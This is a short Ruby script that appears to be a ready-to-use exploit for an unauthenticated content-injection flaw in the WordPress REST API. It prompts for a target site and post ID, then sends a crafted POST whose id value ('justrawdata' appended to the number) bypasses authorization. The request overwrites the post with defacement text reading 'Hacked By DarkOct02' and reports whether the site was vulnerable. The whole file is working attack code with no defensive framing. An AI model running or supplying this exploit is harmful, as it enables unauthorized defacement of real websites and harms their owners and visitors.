require 'rest-client'
require 'json'
puts "Enter Target URI (With wp directory)"
targeturi = gets.chomp
puts "Enter Post ID"
postid = gets.chomp.to_i
response = RestClient.post(
  "#{targeturi}/index.php/wp-json/wp/v2/posts/#{postid}",
  {

    "id" => "#{postid}justrawdata",
    "title" => "Hacked By DarkOct02",
    "content" => "You Have Been Hacked!",
    "slug" => "ha-htm"

  }.to_json,
  :content_type => :json,
  :accept => :json
) {|response, request, result| response }

if(response.code == 200)
puts "Done! '#{targeturi}/index.php?p=#{postid}'"
response

else
puts "This site is not Vulnerable"
end
